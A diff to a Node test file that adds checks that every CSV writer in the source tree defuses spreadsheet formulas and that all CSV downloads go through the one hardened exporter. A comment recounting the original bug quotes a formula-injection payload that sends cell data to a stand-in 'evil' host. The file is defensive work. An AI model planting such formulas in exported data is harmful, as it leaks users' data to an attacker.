@@ -14,6 +14,9 @@
 //      wrong, which is worse than having none.
 //
 // Run: node scripts/tests/csv-import.test.mjs
+import { readFileSync, readdirSync, statSync } from "node:fs";
+import { join } from "node:path";
+import { stripComments } from "../check-mutation-markers.mjs";
 import { loadTs } from "./load-ts.mjs";
 
 let pass = 0,
@@ -326,6 +329,78 @@ console.log("\n== DIGITS THAT ARE NOT 0-9 ==");
   check("normaliseDigits leaves Latin alone", normaliseDigits("2025-03-12"), "2025-03-12");
   check("and leaves letters alone", normaliseDigits("Μαρτίου"), "Μαρτίου");
 }
+
+console.log("\n== 10. EVERY CSV writer in the tree, and every place that serves one ==");
+// THE RULE SAYS "every export defuses" AND THE CHECK DROVE ONE EXPORTER.
+// lib/import/csv-parse.ts states the rule for both directions and
+// lib/download/table-csv.ts honours it at length — so section 2, which
+// only drives table-csv, read as though the rule were held everywhere.
+// It was not: lib/data-analysis/store.ts carried a SECOND toCsv that
+// quoted and shipped the payload intact, and api/data-analysis/[id]/
+// export served it. The data-analysis upload stores rows verbatim, so a
+// supplier's price list carrying `=HYPERLINK("http://evil/?"&A1,"Click")`
+// survived upload, storage and download and executed in the user's own
+// Excel. Found by review 2026-10-15; the duplicate was removed rather
+// than patched, which is why the count below is one.
+//
+// Two populations, both derived rather than listed.
+const CSV_QUOTE = /replace\(\/"\/g,\s*.""./;
+const CSV_JOIN = /\.join\(\s*["`'][,;]["`']\s*\)/;
+// PINNED TO FIXTURES: an empty offender list and a detector that cannot
+// say no print the same line.
+checkTrue("the detector says yes to a CSV cell escaper",
+  CSV_QUOTE.test(`v.replace(/"/g, '""')`) && CSV_JOIN.test(`cells.join(",")`));
+checkTrue("...and no to a file that only escapes a quote",
+  !(CSV_QUOTE.test(`attr.replace(/"/g, '&quot;')`) && CSV_JOIN.test(`parts.join(" ")`)));
+const srcFiles = [];
+(function walk(dir) {
+  for (const entry of readdirSync(dir)) {
+    const full = join(dir, entry);
+    if (statSync(full).isDirectory()) walk(full);
+    else if (/\.(ts|tsx)$/.test(entry)) srcFiles.push(full);
+  }
+})("src");
+
+// ONE: every file that writes CSV cells defuses before it quotes.
+const writers = srcFiles.filter((f) => {
+  const text = readFileSync(f, "utf8");
+  return CSV_QUOTE.test(text) && CSV_JOIN.test(text);
+});
+checkTrue(`the tree has a CSV writer to check (${writers.length})`, writers.length >= 1);
+const undefused = writers.filter((f) => !/neutraliseFormula/.test(readFileSync(f, "utf8")));
+checkTrue(
+  `every CSV writer defuses before it quotes (${writers.length}): ${undefused.join(", ") || "none undefused"}`,
+  undefused.length === 0
+);
+
+// TWO: and nobody HANDS OUT a CSV they built themselves. This is the
+// half that would have caught the original: store.ts's toCsv satisfied
+// the first check vacuously by never being looked at, because the rule
+// was only ever applied to the file somebody remembered.
+//
+// SERVING, not accepting. The first draft matched any `text/csv` and
+// named app/manifest.ts, which lists the type among the files the PWA
+// accepts for UPLOAD and serves nothing — as do three components with
+// an `accept=".csv,…,text/csv"` on a file input. A detector that cannot
+// tell a response from an accept list is a detector that will be
+// silenced the first time it cries wolf. These two shapes set a
+// response type and nothing else does.
+const SERVES_CSV = /Content-Type["']?\s*[:,]\s*["'`]text\/csv|type:\s*["'`]text\/csv/;
+checkTrue("the server detector says yes to a response header",
+  SERVES_CSV.test('headers: { "Content-Type": "text/csv; charset=utf-8" }'));
+checkTrue("...yes to a Blob built for download",
+  SERVES_CSV.test('new Blob([csv], { type: "text/csv;charset=utf-8;" })'));
+checkTrue("...and no to an upload accept list",
+  !SERVES_CSV.test('accept: ["application/pdf", ".pdf", "text/csv", ".csv"]') &&
+  !SERVES_CSV.test('accept=".csv,.xlsx,text/csv"'));
+const servers = srcFiles.filter((f) => SERVES_CSV.test(stripComments(readFileSync(f, "utf8"))));
+const HARDENED = /\btoCSV\s*\(|\bdownloadCSV\s*\(/;
+const homeRolled = servers.filter((f) => {
+  if (f.endsWith(join("lib", "download", "table-csv.ts"))) return false; // the hardened one itself
+  return !HARDENED.test(stripComments(readFileSync(f, "utf8")));
+});
+checkTrue(`everything that hands out a CSV builds it with the one exporter (${servers.length} hand one out, ${homeRolled.length} home-rolled: ${homeRolled.join(", ") || "none"})`,
+  servers.length >= 2 && homeRolled.length === 0);
 
 console.log(`\n${fail === 0 ? "ALL PASS" : "FAILURES"}: ${pass} passed, ${fail} failed`);
 process.exit(fail === 0 ? 0 : 1);
